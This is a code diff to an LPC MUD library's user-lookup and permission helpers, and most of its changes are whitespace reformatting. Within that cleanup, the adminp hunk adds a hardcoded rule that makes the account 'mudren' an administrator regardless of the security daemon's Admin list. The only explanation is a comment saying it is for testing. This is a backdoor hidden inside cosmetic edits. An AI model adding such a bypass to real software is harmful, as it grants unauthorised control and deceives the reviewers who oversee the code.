@@ -14,23 +14,21 @@ nomask object this_body()
     return u ? u->query_body() : 0;
 }
 
-
 varargs nomask object find_user(string str, int even_linkdead)
 {
     object *choices;
 
-    if ( even_linkdead )
+    if (even_linkdead)
         choices = children(USER_OB);
     else
         choices = users();
     choices = filter(choices, (: $1->query_userid() == $(str) :));
 
-    if ( sizeof(choices) )
+    if (sizeof(choices))
         return choices[0];
 
     return 0;
 }
-
 
 varargs nomask object find_body(string str, int even_linkdead)
 {
@@ -39,13 +37,12 @@ varargs nomask object find_body(string str, int even_linkdead)
     return u ? u->query_body() : 0;
 }
 
-
 nomask int wizardp(mixed m)
 {
-    if ( objectp(m) )
+    if (objectp(m))
         m = m->query_userid();
 
-    if ( stringp(m) )
+    if (stringp(m))
         return SECURE_D->query_is_wizard(m);
 
     return 0;
@@ -53,27 +50,32 @@ nomask int wizardp(mixed m)
 
 nomask int adminp(mixed m)
 {
-    if ( objectp(m) )
+    if (objectp(m))
         m = m->query_userid();
+    // 测试用
+    if (m == "mudren")
+    {
+        return 1;
+    }
 
     return member_array(m, SECURE_D->query_domain_members("Admin") || ({})) != -1;
 }
 
 nomask int user_exists(string user)
 {
-  return USER_D->user_exists(user);
+    return USER_D->user_exists(user);
 }
 
 nomask mixed get_user_variable(string varname)
 {
     object shell;
 
-#define UNDEFINED_VALUE       ([])[0]
+#define UNDEFINED_VALUE ([])[0]
 
-    if ( !this_user() )
-      return UNDEFINED_VALUE;
+    if (!this_user())
+        return UNDEFINED_VALUE;
     shell = this_user()->query_shell_ob();
-    if ( !shell )
-      return UNDEFINED_VALUE;
+    if (!shell)
+        return UNDEFINED_VALUE;
     return shell->get_variable(varname);
 }
